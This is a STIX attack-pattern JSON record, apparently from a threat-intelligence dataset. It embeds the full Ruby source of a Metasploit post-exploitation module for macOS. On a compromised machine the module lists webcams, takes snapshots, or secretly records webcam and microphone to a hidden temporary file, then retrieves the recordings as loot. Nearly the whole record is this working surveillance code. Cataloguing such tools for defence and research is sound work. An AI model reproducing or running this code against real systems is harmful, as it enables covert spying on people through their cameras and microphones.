{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--763ea950-a8d5-4670-9c43-a381647f005a",
    "created": "2024-08-14T16:33:00.692188Z",
    "modified": "2024-08-14T16:33:00.692192Z",
    "name": "OSX Manage Webcam",
    "description": " This module will allow the user to detect installed webcams (with the LIST action), take a snapshot (with the SNAPSHOT action), or record a webcam and mic (with the RECORD action)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/manage/webcam.rb",
            "external_id": "webcam.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'shellwords'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n  include Msf::Post::OSX::RubyDL\n\n  POLL_TIMEOUT = 120\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Manage Webcam',\n        'Description' => %q{\n          This module will allow the user to detect installed webcams (with\n          the LIST action), take a snapshot (with the SNAPSHOT action), or\n          record a webcam and mic (with the RECORD action)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev'],\n        'Platform' => [ 'osx'],\n        'SessionTypes' => [ 'shell' ],\n        'Actions' => [\n          [ 'LIST', { 'Description' => 'Show a list of webcams' } ],\n          [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ],\n          [ 'RECORD', { 'Description' => 'Record with the webcam' } ]\n        ],\n        'DefaultAction' => 'LIST'\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use. `set ACTION LIST` to get a list.', 0]),\n        OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),\n        OptString.new('JPG_QUALITY', [false, 'The compression factor for snapshotting a jpg (from 0 to 1)', '0.8']),\n        OptString.new('TMP_FILE',\n                      [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']),\n        OptBool.new('AUDIO_ENABLED', [false, 'Enable audio when recording', true]),\n        OptString.new('AUDIO_COMPRESSION',\n                      [true, 'Compression type to use for audio', 'QTCompressionOptionsHighQualityAACAudio']),\n        OptString.new('VIDEO_COMPRESSION',\n                      [true, 'Compression type to use for video', 'QTCompressionOptionsSD480SizeH264Video']),\n        OptEnum.new('SNAP_FILETYPE',\n                    [true, 'File format to use when saving a snapshot', 'png', %w[jpg png gif tiff bmp]]),\n        OptInt.new('RECORD_LEN', [true, 'Number of seconds to record', 30]),\n        OptInt.new('SYNC_WAIT', [true, 'Wait between syncing chunks of output', 5])\n      ]\n    )\n  end\n\n  def run\n    fail_with(Failure::BadConfig, 'Invalid session ID selected.') if client.nil?\n    fail_with(Failure::BadConfig, 'Invalid action') if action.nil?\n\n    num_chunks = (datastore['RECORD_LEN'].to_f / datastore['SYNC_WAIT'].to_f).ceil\n    tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10) + '1' }\n    ruby_cmd = osx_capture_media(\n      action: action.name.downcase,\n      snap_filetype: datastore['SNAP_FILETYPE'],\n      audio_enabled: datastore['AUDIO_ENABLED'],\n      video_enabled: true,\n      num_chunks: num_chunks,\n      chunk_len: datastore['SYNC_WAIT'],\n      video_device: datastore['CAMERA_INDEX'],\n      audio_device: datastore['MIC_INDEX'],\n      snap_jpg_compression: datastore['JPG_QUALITY'].to_f,\n      video_compression: datastore['VIDEO_COMPRESSION'],\n      audio_compression: datastore['AUDIO_COMPRESSION'],\n      record_file: tmp_file,\n      snap_file: tmp_file + datastore['SNAP_FILETYPE']\n    )\n\n    output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)\n    if action.name =~ /list/i\n      print_good output\n    elsif action.name =~ /record/i\n      @pid = output.to_i\n      print_status \"Running record service with PID #{@pid}\"\n      (0...num_chunks).each do |i|\n        # wait SYNC_WAIT seconds\n        print_status \"Waiting for #{datastore['SYNC_WAIT'].to_i} seconds\"\n        Rex.sleep(datastore['SYNC_WAIT'])\n        # start reading for file\n        begin\n          ::Timeout.timeout(poll_timeout) do\n            loop do\n              if File.exist?(tmp_file)\n                # read file\n                contents = File.read(tmp_file)\n                # delete file\n                rm_f(tmp_file)\n                # roll filename\n                base = File.basename(tmp_file, '.*') # returns it with no extension\n                num = ((base.match(/\\d+$/) || ['0'])[0].to_i + 1).to_s\n                ext = File.extname(tmp_file) || 'o'\n                tmp_file = File.join(File.dirname(tmp_file), base + num + '.' + ext)\n                # store contents in file\n                title = 'OSX Webcam Recording ' + i.to_s\n                f = store_loot(title, 'video/mov', session, contents,\n                               \"osx_webcam_rec#{i}.mov\", title)\n                print_good \"Record file captured and saved to #{f}\"\n                print_status 'Rolling movie file. '\n                break\n              else\n                Rex.sleep(0.3)\n              end\n            end\n          end\n        rescue ::Timeout::Error\n          fail_with(Failure::TimeoutExpired, 'Client did not respond to new file request, exiting.')\n        end\n      end\n    elsif action.name =~ /snap/i\n      if output.include?('(RuntimeError)')\n        print_error output\n        return\n      end\n\n      snap_type = datastore['SNAP_FILETYPE']\n      img = read_file(tmp_file + snap_type)\n      f = store_loot('OSX Webcam Snapshot', \"image/#{snap_type}\",\n                     session, img, \"osx_webcam_snapshot.#{snap_type}\", 'OSX Webcam Snapshot')\n      print_good \"Snapshot successfully taken and saved to #{f}\"\n    end\n  end\n\n  def cleanup\n    return unless @cleaning_up.nil?\n\n    @cleaning_up = true\n\n    if action.name =~ (/record/i) && !@pid.nil?\n      print_status('Killing record service...')\n      cmd_exec(\"/bin/kill -9 #{@pid}\")\n    end\n  end\n\n  private\n\n  def poll_timeout\n    POLL_TIMEOUT\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx']"
    ]
}